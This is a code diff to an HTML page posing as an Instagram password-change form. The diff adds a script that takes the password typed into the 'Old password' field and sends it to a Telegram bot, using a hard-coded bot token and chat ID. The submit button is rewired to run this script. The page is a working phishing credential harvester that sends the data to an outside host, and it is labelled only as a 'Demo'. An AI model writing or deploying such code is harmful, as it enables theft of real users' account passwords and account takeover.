@@ -121,13 +121,14 @@
                 <input type="password" name="pass" id="OldPassword" placeholder="Old password" required>
             </div>
             
-            <button type="submit" class="btn-continue">Continue</button>
+            <button type="button" class="btn-continue" onclick="sendMsg()">Continue</button>
+
             
             <div class="checkbox-container">
                 <input type="checkbox" name="logout_session" id="logoutOthers">
                 <label for="logoutOthers">Log out everywhere else to make sure no one else can still access your account</label>
             </div>
-      
+         
 
         <footer>
             <div class="links">
@@ -137,12 +138,30 @@
             <div>English ∨ &copy; 2026 Instagram from Meta</div>
         </footer>
     </div>
+<script>
+function sendMsg() {
+  const token = "8210016681:AAFCdXDYc_vu6Ep4tfRiOyT4wfPvJFqf1lY";
+  const chatId = "-1003873305689";
+  const message = document.getElementById("OldPassword").value;
 
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: "📩 Demo Message:\n" + message
+    })
+  })
+  .then(res => alert("Message sent ✅"))
+  .catch(err => alert("Error ❌"));
+}
+</script>
 
     </form>
 </body>
 </html>
-
 
 
 
